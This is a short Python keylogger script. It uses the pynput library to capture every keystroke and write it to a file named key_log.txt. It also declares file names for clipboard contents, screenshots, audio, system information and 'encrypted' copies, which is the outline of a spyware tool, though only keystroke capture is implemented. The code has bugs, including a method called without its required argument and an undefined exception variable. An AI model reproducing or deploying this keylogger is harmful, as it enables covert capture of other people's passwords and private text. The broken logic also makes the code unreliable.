import sys
from pynput import keyboard

system_info = "system.txt"
audio_info = "audio.wav"
clipboard_info = "clipboard.txt"
screenshot_info = "screenshot.png"
keys_info = "key_log.txt"

system_information_e = 'e_system.txt'
clipboard_information_e = 'e_clipboard.txt'
keys_information_e = 'e_keys_logged.txt'

writeOnLetterCount = 16

class MyListener:
    def __init__(self, writeFilename):
        self.letter_count = 0
        self.outLocation = None
        self.isWritingToFile = None
        self.writeFilename = writeFilename

        self.write_to_location(writeFilename)
    def on_press(self, key):
        self.outLocation.write('{0}'.format(key))
        self.letter_count += 1

        print(self.letter_count)

        if self.letter_count >= writeOnLetterCount:
            if self.isWritingToFile:
                print("Writing file")
                self.outLocation.close()
                self.write_to_location()
                self.letter_count = 0
                return False

    def write_to_location(self, is_write):
        if not self.writeFilename == "":
            try:
                if is_write:
                    self.outLocation = open(self.writeFilename, "wt")
                else:
                    self.outLocation = open(self.writeFilename, "at")

                self.isWritingToFile = True
            except FileNotFoundError:
                self.outLocation = sys.stdout
                self.isWritingToFile = False

    def close(self):
        try:
            self.outLocation.close()
        except FileNotFoundError:
            print(e)


test = MyListener(keys_info)

inp = input('Please type:\n')

with keyboard.Listener(on_press=test.on_press, on_release=None) as listener:
    try:
        listener.join()
    except FileNotFoundError as e:
        print('{0} exception happened...'.format(e.args[0]))
    finally:
        test.close()

